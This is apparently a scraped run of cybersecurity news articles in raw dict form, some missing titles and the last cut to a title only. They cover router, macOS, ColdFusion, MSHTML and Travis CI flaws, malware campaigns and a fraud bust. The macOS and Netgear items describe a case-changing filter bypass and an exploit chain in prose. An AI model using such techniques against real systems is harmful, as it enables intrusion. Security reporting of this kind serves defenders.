Consider, for example, the infamous data breach of retailer Target in 2013. The attackers gained access to Target’s gateway by using stolen credentials and then exploited various weaknesses to gain access to the customer service database.\nThe zero trust principle of multi-factor authentication could have stopped stolen credentials from being used in the first place. Even if the attacker had managed to log in, however, implementing least privilege access successfully might have stopped the attacker from accessing the database or planting malware (which was also part of the attack). Additionally, security-oriented machine learning mechanisms might have been able to detect the unusual activity and put a halt to the attack.\nWhat about trusting the IT staff?\nAlthough the zero trust model is most often applied to IT systems, it is also important to realize that there are numerous ways for employees to compromise an organization’s security without having to attack an IT system directly. Even something as simple as a call to the organization’s service desk can put an organization’s security in jeopardy.\nIf a user were to contact an organization’s service desk for assistance with an issue such as a password reset, the technician would likely take steps to try to confirm the user’s identity. This might involve asking the user a security question such as their employee ID number. The problem with this is that there are any number of ways that an attacker can source this information and use it to impersonate a legitimate user and obtain access to their account via a fake password reset.\nThe service desk agent can also pose a threat to the organization’s security. After all, there is often nothing stopping the technician from simply resetting a user’s password (without receiving a password reset request) and then using the reset password to gain access to the user’s account.\nSpecops Secure Service Desk can help to eliminate these types of security risks, which is in keeping with zero trust security principles. For example, the helpdesk technician might verify the user’s identity by sending a single-use code to the user’s mobile device or by using a third-party authentication service such as Okta Verify, PingID, Duo Security, or Symantec VIP to verify the user’s identity. At the same time, this tool can prohibit the technician from resetting the user’s password unless the user has verified their identity, thus confirming that the user has requested the password reset as opposed to the technician going rogue. \nSpecops Secure Service Desk on the backend\nConclusion\nAlthough IT systems need to be configured in accordance with zero trust principles, an organization’s security is ultimately in the hands of the users and IT staff. Software such as Specops Secure Service Desk can help to make sure that users and helpdesk technicians are complying with the organization’s security requirements.\n\n\nFound this article interesting?

{'title': 'High-Severity RCE Flaw Disclosed in Several Netgear Router Models',
'text': 'Networking equipment company Netgear has released patches to remediate a high-severity remote code execution vulnerability affecting multiple routers that could be exploited by remote attackers to take control of an affected system.\n\nTraced as CVE-2021-40847 (CVSS score: 8.1), the security weakness impacts the following models -\nR6400v2 (fixed in firmware version 1.0.4.120)R6700 (fixed in firmware version 1.0.2.26)R6700v3 (fixed in firmware version 1.0.4.120)R6900 (fixed in firmware version 1.0.2.26)R6900P (fixed in firmware version 3.3.142_HOTFIX)R7000 (fixed in firmware version 1.0.11.128)R7000P (fixed in firmware version 1.3.3.142_HOTFIX)R7850 (fixed in firmware version 1.0.5.76)R7900 (fixed in firmware version 1.0.4.46)R8000 (fixed in firmware version 1.0.4.76)RS400 (fixed in firmware version 1.5.1.80)\nAccording to GRIMM security researcher Adam Nichols, the vulnerability resides within Circle, a third-party component included in the firmware that offers parental control features in Netgear devices. Particularly, the issue concerns the Circle update daemon, which is enabled to run by default even if the router hasn’t been configured to limit daily internet time for websites and apps, resulting in a scenario that could permit bad actors with network access to gain remote code execution (RCE) as root via a Man-in-the-Middle (MitM) attack.\n\nThis is made possible owing to the manner in which the update daemon (called “circled“) connects to Circle and Netgear to fetch updates to the filtering database — which are both unsigned and downloaded using HTTP — thereby making it possible for an interloper to stage an MitM attack and respond to the update request with a specially-crafted compressed database file, extracting which gives the attacker the ability to overwrite executable binaries with malicious code.\n\n“Since this code is run as root on the affected routers, exploiting it to obtain RCE is just as damaging as a RCE vulnerability found in the core Netgear firmware,“ Nichols said. “This particular vulnerability once again demonstrates the importance of attack surface reduction.“\nThe disclosure comes weeks after Google security engineer Gynvael Coldwind revealed details of three severe security vulnerabilities dubbed Demon’s Cries, Draconian Fear, and Seventh Inferno, impacting over a dozen of its smart switches, allowing threat actors to bypass authentication and gain full control of vulnerable devices.\nUPDATE: Following the publication of the story, Circle shared the below statement with The Hacker News —\n“Circle created software fixes to resolve recently publicized security vulnerabilities for a loader on Netgear routers and has worked with Netgear to ensure that it is available for Netgear customers. Circle recommends that Netgear users ensure that they are using the latest firmware for their Netgear routers. No other Circle customers are impacted by this vulnerability.“\n\n\nFound this article interesting? Follow THN on Facebook, Twitter  and LinkedIn to read more exclusive content we post.',

{'title': 'Unpatched High-Severity Vulnerability Affects Apple macOS Computers',
'text': 'Cybersecurity researchers on Tuesday disclosed details of an unpatched zero-day vulnerability in macOS Finder that could be abused by remote adversaries to trick users into running arbitrary commands on the machines.\n“A vulnerability in macOS Finder allows files whose extension is inetloc to execute arbitrary commands, these files can be embedded inside emails which if the user clicks on them will execute the commands embedded inside them without providing a prompt or warning to the user,“ SSD Secure Disclosure said in a write-up published today.\n\nPark Minchan, an independent security researcher, has been credited with reporting the vulnerability which affects macOS versions of Big Sur and prior.\n\nThe weakness arises due to the manner macOS processes INETLOC files — shortcuts to open internet locations such as RSS feeds, Telnet connections, or other online resources and local files — resulting in a scenario that allows commands embedded in those files to be executed without any warning.\n\n“The case here INETLOC is referring to a ’file://’ protocol which allows running locally (on the user’s computer) stored files,“ SSD said. “If the INETLOC file is attached to an email, clicking on the attachment will trigger the vulnerability without warning.“\n\nAlthough newer versions of macOS have blocked the ’file://’ prefix, the flaw can be still exploited by simply changing the protocol to ’File://’ or ’fIle://’ to effectively circumvent the check. We have reached out to Apple, and we will update the story if we hear back.\n“Newer versions of macOS (from Big Sur) have blocked the ’file://’ prefix (in the com.apple.generic-internet-location) however they did a case matching causing ’File://’ or ’fIle://’ to bypass the check,“ the advisory said. “We have notified Apple that ’FiLe://’ (just mangling the value) doesn’t appear to be blocked, but have not received any response from them since the report has been made.

{'title': 'Cring Ransomware Gang Exploits 11-Year-Old ColdFusion Bug',
'text': 'Unidentified threat actors breached a server running an unpatched, 11-year-old version of Adobe’s ColdFusion 9 software in minutes to remotely take over control and deploy file-encrypting Cring ransomware on the target’s network 79 hours after the hack.\nThe server, which belonged to an unnamed services company, was used to collect timesheet and accounting data for payroll as well as to host a number of virtual machines, according to a report published by Sophos and shared with The Hacker News. The attacks originated from an internet address assigned to the Ukrainian ISP Green Floid.\n\n“Devices running vulnerable, outdated software are low-hanging-fruit for cyberattackers looking for an easy way into a target,“ Sophos principal researcher Andrew Brandt said. “The surprising thing is that this server was in active daily use. Often the most vulnerable devices are inactive or ghost machines, either forgotten about or overlooked when it comes to patching and upgrades.“\nThe British security software firm said the “rapid break-in“ was made possible by exploiting an 11-year-old installation of Adobe ColdFusion 9 running on Windows Server 2008, both of which have reached end-of-life. \n\nUpon gaining an initial foothold, the attackers used a wide range of sophisticated methods to conceal their files, inject code into memory, and cover their tracks by overwriting files with garbled data, not to mention disarm security products by capitalizing on the fact that tamper-protection functionalities were turned off.\nSpecially, the adversary took advantage of CVE-2010-2861, a set of directory traversal vulnerabilities in the administrator console in Adobe ColdFusion 9.0.1 and earlier that could be abused by remote attackers to read arbitrary files, such as those containing administrator password hashes (“password.properties“).\n\nIn the next stage, the bad actor is believed to have exploited another vulnerability in ColdFusion, CVE-2009-3960, to upload a malicious Cascading Stylesheet (CSS) file to the server, consequently using it to load a Cobalt Strike Beacon executable. This binary, then, acted as a conduit for the remote attackers to drop additional payloads, create a user account with admin privileges, and even disable endpoint protection systems and anti-malware engines like Windows Defender, before commencing the encryption process.\n“This is a stark reminder that IT administrators benefit from having an accurate inventory of all their connected assets and cannot leave out-of-date critical business systems facing the public internet,“ Brandt said. “If organizations have these devices anywhere on their network, they can be sure that cyberattackers will be attracted to them.“\n\n\nFound this article interesting?

'text': 'A recently discovered wave of malware attacks has been spotted using a variety of tactics to enslave susceptible machines with easy-to-guess administrative credentials to co-opt them into a network with the goal of illegally mining cryptocurrency.\n“The malware’s primary tactic is to spread by taking advantage of vulnerable systems and weak administrative credentials. Once they’ve been infected, these systems are then used to mine cryptocurrency,“ Akamai security researcher Larry Cashdollar said in a write-up published last week.\n\nThe PHP malware — codenamed “Capoae“ (short for “Сканирование,“ the Russian word for “Scanning“) — is said to be delivered to the hosts via a backdoored addition to a WordPress plugin called “download-monitor,“ which gets installed after successfully brute-forcing WordPress admin credentials. The attacks also involve the deployment of a Golang binary with decryption functionality, with the obfuscated payloads retrieved by leveraging the trojanized plugin to make a GET request from an actor-controlled domain.\n\nAlso included is a feature to decrypted and execute additional payloads, while the Golang binary takes advantage of exploits for multiple remote code execution flaws in Oracle WebLogic Server (CVE-2020-14882), NoneCms (CVE-2018-20062), and Jenkins (CVE-2019-1003029 and CVE-2019-1003030) to brute force its way into systems running SSH and ultimately launch the XMRig mining software.\n\nWhat’s more, the attack chain stands out for its persistence tricks, which includes choosing a legitimate-looking system path on the disk where system binaries are likely to be found as well as generating a random six-character filename that’s then subsequently used to copy itself into the new location on the system before deleting the malware upon execution.\n“The Capoae campaign’s use of multiple vulnerabilities and tactics highlights just how intent these operators are on getting a foothold on as many machines as possible,“ Cashdollar said. “The good news is, the same techniques we recommend for most organizations to keep systems and networks secure still apply here.“\n“Don’t use weak or default credentials for servers or deployed applications,“ Cashdollar added. “Ensure you’re keeping those deployed applications up to date with the latest security patches and check in on them from time to time. Keeping an eye out for higher than normal system resource consumption, odd/unexpected running processes, suspicious artifacts and suspicious access log entries, etc., will help you potentially identify compromised machines.“\n\n\nFound this article interesting?

{'title': 'Cybersecurity Priorities in 2021: How Can CISOs Re-Analyze and Shift Focus?',
'text': '2020 was a year of relentless disruptions. The protective layer of secured enterprise networks and controlled IT environments of the physical premises did not exist. Over the past year, CISOs (Chief Information Security Officers) have had to grapple with the challenges of bolstering the security posture, minimizing risks, and ensuring business continuity in the new normal. The rise in volumes and sophistication of cyberattacks in the rather borderless IT situation only compounded the challenges. All this has necessitated a shift in cybersecurity priorities in 2021.\nIn this article, we have put together the top cybersecurity priorities for 2021 and beyond that will enable businesses to be fully equipped for future disruptions, without compromising on security.\nCybersecurity Priorities for 2021\nStrengthen the Cybersecurity Fundamentals \nCISOs must focus on security fundamentals, including asset management, password management, cyber hygiene, configuration, vulnerability management, patching, threat detection and prevention, user education, reporting, documentation, and so on. Without a solid foundation, any investment in cybersecurity will not yield the kind of benefits it should. \nOrganizations must redesign their security defenses in such a manner that it works, with or without the secure, controlled environment of the office premises. The security solution chosen must offer always-on, multi-layered, intelligent protection against existing and emerging threats. The solution must be continuously updated based on global threat intelligence and past attack history. In addition, it must assure zero false positives. \nCybersecurity Must Be a Boardroom Agenda \nCybersecurity is a business concern and needs to be treated as one, instead of being looked at as an IT issue. CISOs need to be aware of the business risks, that’s a given. Similarly, the other leaders and executives need to be aware of the threat landscape, the security risks involved, and the level of investment required to counter them and strengthen the security posture. After all, in the case of a security breach, the CEOs and the boards will have to answer questions on how it occurred.\nFurther, organizations need to create a culture of cybersecurity that starts with the board and percolates down. When the leaders lead from the front, buy-ins are easier among the employees in adopting and maintaining standards of security in their routine work. \nLeverage Intelligent Automation and Other Advanced Technology \nThe level of sophistication of attacks has increased manifold in the past couple of years. Attackers leveraging advanced technology to infiltrate company networks and gain access to mission-critical assets. \nGiven this scenario, organizations too need to leverage futuristic technology such as next-gen WAF, intelligent automation, behavior analytics, deep learning, security analytics, and so on to prevent even the most complex and sophisticated attacks. Automation also enables organizations to gain speed and scalability in the broader IT environment with ramped-up attack activity. Security solutions like Indusface’s AppTrana enable all this and more. \nShift to A Zero Trust Architecture \nRemote work is here to stay, and the concept of the network perimeter is blurring. For business continuity, organizations have to enable access of mission-critical assets to employees wherever they are. Employees are probably accessing these resources from personal, shared devices and unsecured networks. CISOs need to think strategically and implement borderless security based on a zero-trust architecture. \nZero-trust architecture mandates that organizations always verify and never trust with respect to data, employees, networks, and devices. So, CISOs need to redesign their security controls and identity and access management policies to reflect the current scenario.\nTo this end, they must have full visibility into connected devices and the rapidly expanding endpoints.\nThey must have updated intelligence on what data is produced by the connected devices, who is connecting to company networks and from where, what are they accessing, are they authorized to access that and so on. \nFocus on Securing Your Cloud Infrastructure \nEven though cloud adoption was on the rise, the pandemic led to an almost instant surge in the use of public cloud and cloud-native resources. However, this isn’t a momentary surge; the shift to cloud usage is permanent.\nThis essentially means that CISO’s need to rethink their security policies to secure the cloud infrastructure. They must deploy new intelligent tools & technology, holistic processes, and comprehensive governance models that provide visibility into the cloud environment and help secure the cloud infrastructure.\nDevelop Robust Continuity Plans \nOrganizations typically have security incident response plans and business continuity plans. But neither factored in worldwide impact events such as the Covid-19 pandemic. The cybersecurity priorities for 2021 and beyond require CISOs and business leaders to develop robust continuity and resilience plans for such events. \nThe Way Forward\nThe Covid-19 pandemic has furthered the case for creating autonomous teams in a hybrid work environment to ensure increased agility and responsiveness to the relentless changes in the future. The cybersecurity priorities for 2021 and beyond provide an insight into how CISOs can redesign security to be better equipped for the future. \n\n\nFound this article interesting?

'text': 'Law enforcement agencies in Italy and Spain have dismantled an organized crime group linked to the Italian Mafia that was involved in online fraud, money laundering, drug trafficking, and property crime, netting the gang about €10 million ($11.7 million) in illegal proceeds in just a year.\n“The suspects defrauded hundreds of victims through phishing attacks and other types of online fraud such as SIM swapping and business email compromise before laundering the money through a wide network of money mules and shell companies,“ Europol said in a statement published today. \n\nThe group operated out of Tenerife, located in Spain’s Canary Islands.\nThe development comes following a year-long sting operation that saw as many as 16 house searches in Santa Cruz de Tenerife, Turin, and Isernia, resulting in 106 arrests — mostly in Spain and Italy — and seizure of electronic devices, 224 credit cards, SIM cards, point-of-sale terminals, a marijuana plantation, and equipment used for its cultivation and distribution. 118 bank accounts have also been frozen as a result of the bust.\nThe criminal network is said to have been fashioned as a pyramid structure, with different members roped in for specialized roles, including computer experts, who created phishing domains and facilitated cyber fraud, as well as recruiters who were involved in money muling activities, and specialists adept in cryptocurrencies and money laundering.\n\nThe arrested members, a majority of whom are Italian nationals with links to mafia cartels such as Camorra Napolitana, Casamonica, Nuvoletta, and Sacra Corona Unita, lured their victims into transferring large amounts of money to bank accounts under their control. The illicitly acquired profits were then laundered through a wide network of money mules and shell companies.\nThe Italian National Police, in a separate statement, noted that the hackers had expertise in the latest generation phishing and vishing attacks and in the use of social engineering techniques, adding the “stolen sums were later recycled through the purchase of cryptocurrency or reinvested in further criminal activities, such as prostitution, drug production and trafficking, [and] arms trafficking.“\nThe investigation was undertaken jointly by the Spanish National Police (Policía Nacional), and supported by the Italian National Police (Polizia di Stato), Europol, and Eurojust.\n“This group of criminals had managed to settle and enter different levels of society: Business networks, law firms and banking entities, among others,“ the Spanish National Police said in a press release. “This level of settlement not only gave the organization impunity for money laundering, but also for the different criminal activities of these Mafia groups carried out in Spain.“\n\n\nFound this article interesting?

'text': 'A spam campaign delivering spear-phishing emails aimed at South American organizations has retooled its techniques to include a wide range of commodity remote access trojans (RATs) and geolocation filtering to avoid detection, according to new research.\nCybersecurity firm Trend Micro attributed the attacks to an advanced persistent threat (APT) tracked as APT-C-36 (aka Blind Eagle), a suspected South America espionage group that has been active since at least 2018 and previously known for setting its sights on Colombian government institutions and corporations spanning financial, petroleum, and manufacturing sectors.\n\nPrimarily spread via fraudulent emails by masquerading as Colombian government agencies, such as the National Directorate of Taxes and Customs (DIAN), the infection chain commences when the message recipients open a decoy PDF or Word document that claims to be a seizure order tied to their bank accounts and click on a link that’s been generated from a URL shortener service like cort.as, acortaurl.com, and gtly.to.\n“These URL shorteners are capable of geographical targeting, so if a user from a country not targeted by the threat actors clicks on the link, they will be redirected to a legitimate website,“ Trend Micro researchers detailed in a report published last week. “The URL shorteners also have the ability to detect the major VPN services, in which case, the shortened link leads the users to a legitimate website instead of redirecting them to the malicious link.“\n\nShould the victim meet the location criteria, the user is redirected to a file hosting server, and a password-protected archive is automatically downloaded, the password for which is specified in the email or the attachment, ultimately leading to the execution of a C++-based remote access trojan called BitRAT that first came to light in August 2020.\nMultiple verticals, including government, financial, healthcare, telecommunications, and energy, oil, and gas, are said to have been affected, with a majority of the targets for the latest campaign located in Colombia and a smaller fraction also coming from Ecuador, Spain, and Panama.\n“APT-C-36 selects their targets based on location and most likely the financial standing of the email recipient,“ the researchers said. “These, and the prevalence of the emails, lead us to conclude that the threat actor’s ultimate goal is financial gain rather than espionage.“\n\n\nFound this article interesting?

'text': 'Google on Friday said it’s bringing an Android 11 feature that auto-resets permissions granted to apps that haven’t been used in months, to devices running Android versions 6 and above.\nThe expansion is expected to go live later this year in December 2021 and enabled on Android phones with Google Play services running Android 6.0 (API level 23) or higher, which the company said should cover “billions more devices.“ Google officially released Android 6.0 Marshmallow on October 5, 2015.\n\nWith Android 11 that came out last year, the internet giant introduced a permission auto-reset option that helps improve user privacy by automatically resetting an app’s permissions to access sensitive features like storage or camera if the app in question is left unopened for a few months.\n“Some apps and permissions are automatically exempted from revocation, like active Device Administrator apps used by enterprises, and permissions fixed by enterprise policy,“ Google noted. While permission auto-reset will be turned on by default for apps targeting Android 11 (API level 30) or higher, the new feature has to be enabled manually for apps targeting API levels 23 to 29.\nThe rollout is slated to be complete by sometime in Q1 2022.\n\nThe changes are part of a number of user-facing privacy and security features that Google has pushed out in recent months. The Mountain View-based company, in late July, said it intends to disallow users from signing in to their Google accounts from Android devices running versions 2.3.7 or lower starting September 27, 2021.\n\nEarlier this year, Google announced plans to add iOS-style privacy labels to app listings on the Play Store that highlight the various types of data being collected and how it’s used, in addition to limiting apps, with the exception of a few, from accessing the list of installed apps on Android devices. In June 2021, Google also moved to strip users’ advertising IDs when opting out of ads personalization in Android Settings as part of a Google Play services update.\n\n\nFound this article interesting?

'text': 'A newly spotted banking trojan has been caught leveraging legitimate platforms like YouTube and Pastebin to store its encrypted, remote configuration and commandeer infected Windows systems, making it the latest to join the long list of malware targeting Latin America (LATAM) after Guildma, Javali, Melcoz, Grandoreiro, Mekotio, Casbaneiro, Amavaldo, Vadokrist, and Janeleiro.\nThe threat actor behind this malware family — dubbed “Numando“ — is believed to have been active since at least 2018.\n\n“[Numando brings] interesting new techniques to the pool of Latin American banking trojans’ tricks, like using seemingly useless ZIP archives or bundling payloads with decoy BMP images,“ ESET researchers said in a technical analysis published on Friday. “Geographically, it focuses almost exclusively on Brazil with rare campaigns in Mexico and Spain.“\nWritten in Delphi, the malware comes with an array of backdoor capabilities that allow it to control compromised machines, simulate mouse and keyboard actions, restart and shutdown the host, display overlay windows, capture screenshots, and terminate browser processes. Numando is “almost exclusively“ propagated by spam campaigns, ensnaring several hundred victims to date, according to the cybersecurity firm’s telemetry data.\n\nThe attacks begin with a phishing message that comes embedded with a ZIP attachment containing an MSI installer, which, in turn, includes a cabinet archive with a legitimate application, an injector, and an encrypted Numando banking trojan DLL. Executing the MSI leads to the execution of the application, causing the injector module to be side-loaded and decrypt the final-stage malware payload.\n\nIn an alternate distribution chain observed by ESET, the malware takes the form of a “suspiciously large“ but valid BMP image file, from which the injector extracts and executes the Numando banking trojan. What makes the campaign stand out is its use of YouTube video titles and descriptions — now taken down — to store the remote configuration such as the IP address of the command-and-control server.\n“[The malware] uses fake overlay windows, contains backdoor functionality, and utilizes MSI [installer],“ the researchers said. “It is the only LATAM banking trojan written in Delphi that uses a non-Delphi injector and its remote configuration format is unique, making two reliable factors when identifying this malware family.“\n\n\nFound this article interesting?

'text': 'A number of malicious samples have been created for the Windows Subsystem for Linux (WSL) with the goal of compromising Windows machines, highlighting a sneaky method that allows the operators to stay under the radar and thwart detection by popular anti-malware engines.\nThe “distinct tradecraft“ marks the first instance where a threat actor has been found abusing WSL to install subsequent payloads.\n“These files acted as loaders running a payload that was either embedded within the sample or retrieved from a remote server and was then injected into a running process using Windows API calls,“ researchers from Lumen Black Lotus Labs said in a report published on Thursday.\n\nWindows Subsystem for Linux, launched in August 2016, is a compatibility layer that’s designed to run Linux binary executables (in ELF format) natively on the Windows platform without the overhead of a traditional virtual machine or dual-boot setup.\n\nThe earliest artifacts date back to May 3, 2021, with a series of Linux binaries uploaded every two to three weeks till August 22, 2021. Not only are the samples written in Python 3 and converted into an ELF executable with PyInstaller, but the files are also orchestrated to download shellcode from a remote command-and-control server and employ PowerShell to carry out follow-on activities on the infected host.\n\nThis secondary “shellcode“ payload is then injected into a running Windows process using Windows API calls for what Lumen described as “ELF to Windows binary file execution,“ but not before the sample attempts to terminate suspected antivirus products and analysis tools running on the machine. What’s more, the use of standard Python libraries makes some of the variants interoperable on both Windows and Linux.\n“Thus far, we have identified a limited number of samples with only one publicly routable IP address, indicating that this activity is quite limited in scope or potentially still in development,“ the researchers said. “As the once distinct boundaries between operating systems continue to become more nebulous, threat actors will take advantage of new attack surfaces.“ \n\n\nFound this article interesting?

'text': 'A targeted phishing campaign aimed at the aviation industry for two years may be spearheaded by a threat actor operating out of Nigeria, highlighting how attackers can carry out small-scale cyber offensives for extended periods of time while staying under the radar.\nCisco Talos dubbed the malware attacks “Operation Layover,“ building on previous research from the Microsoft Security Intelligence team in May 2021 that delved into a “dynamic campaign targeting the aerospace and travel sectors with spear-phishing emails that distribute an actively developed loader, which then delivers RevengeRAT or AsyncRAT.“\n\n“The actor […] doesn’t seem to be technically sophisticated, using off-the-shelf malware since the beginning of its activities without developing its own malware,“ researchers Tiago Pereira and Vitor Ventura said. “The actor also buys the crypters that allow the usage of such malware without being detected, throughout the years it has used several different cryptors, mostly bought on online forums.“\n\nThe threat actor is believed to have been active at least since 2013. The attacks involve emails containing specific lure documents centered around the aviation or cargo industry that purport to be PDF files but link to a VBScript file hosted on Google Drive, which ultimately leads to the delivery of remote access trojans (RATs) like AsyncRAT and njRAT, leaving organizations vulnerable to an array of security risks. Cisco Talos said it found 31 different aviation-themed lures dating all the way back to August 2018.\n\nFurther analysis of the activity associated with different domains used in the attacks show that the actor weaved multiple RATs into their campaigns, with the infrastructure used as command-and-control (C2) servers for Cybergate RAT, AsyncRAT, and a batch file that’s used as part of a malware chain to download and execute other malware.\n“Many actors can have limited technical knowledge but still be able to operate RATs or information-stealers, posing a significant risk to large corporations given the right conditions,“ the researchers said. “In this case, […] what seemed like a simple campaign is, in fact, a continuous operation that has been active for three years, targeting an entire industry with off-the-shelf malware disguised with different crypters.“\n\n\nFound this article interesting?

'text': 'Continuous integration vendor Travis CI has patched a serious security flaw that exposed API keys, access tokens, and credentials, potentially putting organizations that use public source code repositories at risk of further attacks.\nThe issue — tracked as CVE-2021-41077 — concerns unauthorized access and plunder of secret environment data associated with a public open-source project during the software build process. The problem is said to have lasted during an eight-day window between September 3 and September 10.\nFelix Lange of Ethereum has been credited with discovering the leakage on September 7, with the company’s Péter Szilágyi pointing out that “anyone could exfiltrate these and gain lateral movement into 1000s of [organizations].“\n\nTravis CI is a hosted CI/CD (short for continuous integration and continuous deployment) solution used to build and test software projects hosted on source code repository systems like GitHub and Bitbucket.\n“The desired behavior (if .travis.yml has been created locally by a customer, and added to git) is for a Travis service to perform builds in a way that prevents public access to customer-specific secret environment data such as signing keys, access credentials, and API tokens,“ the vulnerability description reads. “However, during the stated 8-day interval, secret data could be revealed to an unauthorized actor who forked a public repository and printed files during a build process.“\nIn other words, a public repository forked from another one could file a pull request that could obtain secret environmental variables set in the original upstream repository. Travis CI, in its own documentation, notes that “Encrypted environment variables are not available to pull requests from forks due to the security risk of exposing such information to unknown code.“\nIt has also acknowledged the risk of exposure stemming from an external pull request: “A pull request sent from a fork of the upstream repository could be manipulated to expose environment variables. The upstream repository’s maintainer would have no protection against this attack, as pull requests can be sent by anyone who forks the repository on GitHub.“\n\nSzilágyi also called out Travis CI for downplaying the incident and failing to admit the “gravity“ of the issue, while also urging GitHub to ban the company over its poor security posture and vulnerability disclosure processes. “After three days of pressure from multiple projects, [Travis CI] silently patched the issue on the 10th,“ Szilágyi tweeted. “No analysis, no security report, no post mortem, not warning any of their users that their secrets might have been stolen.“\nThe Berlin-based DevOps platform company on September 13 published a terse “security bulletin,“ advising users to rotate their keys on a regular basis, and followed it up with a second notice on its community forums stating that it has no found no evidence the bug was exploited by malicious parties.\n“Due to the extremely irresponsible way [Travis CI] handled this situation, and their subsequent refusal to warn their users about potentially leaked secrets, we can only recommend everyone to immediately and indefinitely transfer away from Travis,“ Szilágyi added.\n\n\nFound this article interesting?

{'title': 'Third Critical Bug Affects Netgear Smart Switches — Details and PoC Released',
'text': 'New details have been revealed about a recently remediated critical vulnerability in Netgear smart switches that could be leveraged by an attacker to potentially execute malicious code and take control of vulnerable devices.\nThe flaw — dubbed “Seventh Inferno“ (CVSS score: 9.8) — is part of a trio of security weaknesses, called Demon’s Cries (CVSS score: 9.8) and Draconian Fear (CVSS score: 7.8), that Google security engineer Gynvael Coldwind reported to the networking, storage, and security solutions provider.\nThe disclosure comes weeks after Netgear released patches to address the vulnerabilities earlier this month, on September 3.\n\nSuccessful exploitation of Demon’s Cries and Draconian Fear could grant a malicious party the ability to change the administrator password without actually having to know the previous password or hijack the session bootstrapping information, resulting in a full compromise of the device.\nNow, in a new post sharing technical specifics about Seventh Inferno, Coldwind noted that the issue relates to a newline injection flaw in the password field during Web UI authentication, effectively enabling the attacker to create fake session files, and combine it with a reboot Denial of Service (DoS) and a post-authentication shell injection to get a fully valid session and execute any code as root user, thereby leading to full device compromise.\nThe reboot DoS is a technique designed to reboot the switch by exploiting the newline injection to write “2“ into three different kernel configurations — “/proc/sys/vm/panic_on_oom,“ “/proc/sys/kernel/panic,“ and “/proc/sys/kernel/panic_on_oops“ — in a manner that causes the device to compulsorily shut down and restart due to kernel panic when all the available RAM is consumed upon uploading a large file over HTTP.\n“This vulnerability and exploit chain is actually quite interesting technically,“ Coldwind said. “In short, it goes from a newline injection in the password field, through being able to write a file with constant uncontrolled content of ’2’ (like, one byte 32h), through a DoS and session crafting (which yields an admin web UI user), to an eventual post-auth shell injection (which yields full root).“\n\nThe full list of models impacted by the three vulnerabilities is below —\nGC108P (fixed in firmware version 1.0.8.2)GC108PP (fixed in firmware version 1.0.8.2)GS108Tv3 (fixed in firmware version 7.0.7.2)GS110TPP (fixed in firmware version 7.0.7.2)GS110TPv3 (fixed in firmware version 7.0.7.2)GS110TUP (fixed in firmware version 1.0.5.3)GS308T (fixed in firmware version 1.0.3.2)GS310TP (fixed in firmware version 1.0.3.2)GS710TUP (fixed in firmware version 1.0.5.3)GS716TP (fixed in firmware version 1.0.4.2)GS716TPP (fixed in firmware version 1.0.4.2)GS724TPP (fixed in firmware version 2.0.6.3)GS724TPv2 (fixed in firmware version 2.0.6.3)GS728TPPv2 (fixed in firmware version 6.0.8.2)GS728TPv2 (fixed in firmware version 6.0.8.2)GS750E (fixed in firmware version 1.0.1.10)GS752TPP (fixed in firmware version 6.0.8.2)GS752TPv2 (fixed in firmware version 6.0.8.2)MS510TXM (fixed in firmware version 1.0.4.2)MS510TXUP (fixed in firmware version 1.0.4.2)\n\n\nFound this article interesting?

{'title': 'Windows MSHTML 0-Day Exploited to Deploy Cobalt Strike Beacon in Targeted Attacks',
'text': 'Microsoft on Wednesday disclosed details of a targeted phishing campaign that leveraged a now-patched zero-day flaw in its MSHTML platform using specially-crafted Office documents to deploy Cobalt Strike Beacon on compromised Windows systems.\n“These attacks used the vulnerability, tracked as CVE-2021-40444, as part of an initial access campaign that distributed custom Cobalt Strike Beacon loaders,“ Microsoft Threat Intelligence Center said in a technical write-up. “These loaders communicated with an infrastructure that Microsoft associates with multiple cybercriminal campaigns, including human-operated ransomware.“\n\nDetails about CVE-2021-40444 (CVSS score: 8.8) first emerged on September 7 after researchers from EXPMON alerted the Windows maker about a “highly sophisticated zero-day attack“ aimed at Microsoft Office users by taking advantage of a remote code execution vulnerability in MSHTML (aka Trident), a proprietary browser engine for the now-discontinued Internet Explorer and which is used in Office to render web content inside Word, Excel, and PowerPoint documents.\n“The observed attack vector relies on a malicious ActiveX control that could be loaded by the browser rendering engine using a malicious Office document,“ the researchers noted. Microsoft has since rolled out a fix for the vulnerability as part of its Patch Tuesday updates a week later on September 14.\nThe Redmond-based tech giant attributed the activities to related cybercriminal clusters it tracks as DEV-0413 and DEV-0365, the latter of which is the company’s moniker for the emerging threat group associated with creating and managing the Cobalt Strike infrastructure used in the attacks. The earliest exploitation attempt by DEV-0413 dates back to August 18.\nThe exploit delivery mechanism originates from emails impersonating contracts and legal agreements hosted on file-sharing sites. Opening the malware-laced document leads to the download of a Cabinet archive file containing a DLL bearing an INF file extension that, when decompressed, leads to the execution of a function within that DLL. The DLL, in turn, retrieves remotely hosted shellcode — a custom Cobalt Strike Beacon loader — and loads it into the Microsoft address import tool.\n\nAdditionally, Microsoft said some of the infrastructures that were used by DEV-0413 to host the malicious artifacts were also involved in the delivery of BazaLoader and Trickbot payloads, a separate set of activities the company monitors under the codename DEV-0193 (and by Mandiant as UNC1878).\n“At least one organization that was successfully compromised by DEV-0413 in their August campaign was previously compromised by a wave of similarly-themed malware that interacted with DEV-0365 infrastructure almost two months before the CVE-2021-40444 attack,“ the researchers said. “It is currently not known whether the retargeting of this organization was intentional, but it reinforces the connection between DEV-0413 and DEV-0365 beyond sharing of infrastructure.“\nIn an independent investigation, Microsoft’s RiskIQ subsidiary attributed the attacks with high confidence to a ransomware syndicate known as Wizard Spider aka Ryuk, noting that the network infrastructure employed to provide command-and-control to the Cobalt Strike Beacon implants spanned more than 200 active servers.\n“The association of a zero-day exploit with a ransomware group, however remote, is troubling,“ RiskIQ researchers said. It suggests either that turnkey tools like zero-day exploits have found their way into the already robust ransomware-as-a-service (RaaS) ecosystem or that the more operationally sophisticated groups engaged in traditional, government-backed espionage are using criminally controlled infrastructure to misdirect and impede attribution.“\n\n\n\nFound this article interesting?

{'title': 'You Can Now Sign-in to Your Microsoft Accounts Without a Password',
